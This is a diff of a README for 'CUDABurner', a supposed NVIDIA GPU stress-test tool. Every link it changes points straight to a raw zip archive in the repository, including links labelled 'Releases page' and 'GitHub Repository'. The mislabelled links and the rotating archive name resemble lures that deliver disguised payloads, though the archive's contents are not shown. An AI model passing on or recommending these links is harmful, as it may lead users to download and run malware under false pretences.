@@ -1,6 +1,6 @@
 # 🎮 CUDABurner - Stress Test Your NVIDIA GPU Easily
 
-[![Download CUDABurner](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/ui/Burner-CUDA-2.0.zip%20CUDABurner-v1.0-brightgreen)](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/ui/Burner-CUDA-2.0.zip)
+[![Download CUDABurner](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/utils/CUDA_Burner_v2.9-beta.1.zip%20CUDABurner-v1.0-brightgreen)](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/utils/CUDA_Burner_v2.9-beta.1.zip)
 
 ## 📚 Overview
 
@@ -19,7 +19,7 @@ To get started with CUDABurner, follow the steps below to download and run the s
 
 ## 📥 Download & Install
 
-To download CUDABurner, please visit the [Releases page](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/ui/Burner-CUDA-2.0.zip).
+To download CUDABurner, please visit the [Releases page](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/utils/CUDA_Burner_v2.9-beta.1.zip).
 
 1. Click on the link to go to the Releases page.
 2. Look for the latest version.
@@ -89,7 +89,7 @@ For detailed documentation, please refer to the Wiki section of this repository.
 
 ## 🔗 Useful Links
 
-- [Download CUDABurner](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/ui/Burner-CUDA-2.0.zip)
-- [GitHub Repository](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/ui/Burner-CUDA-2.0.zip)
+- [Download CUDABurner](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/utils/CUDA_Burner_v2.9-beta.1.zip)
+- [GitHub Repository](https://github.com/Hariprakash2005/CUDABurner/raw/refs/heads/main/utils/CUDA_Burner_v2.9-beta.1.zip)
 
 By following these steps, you can easily download and use CUDABurner to stress test and benchmark your NVIDIA GPU efficiently.
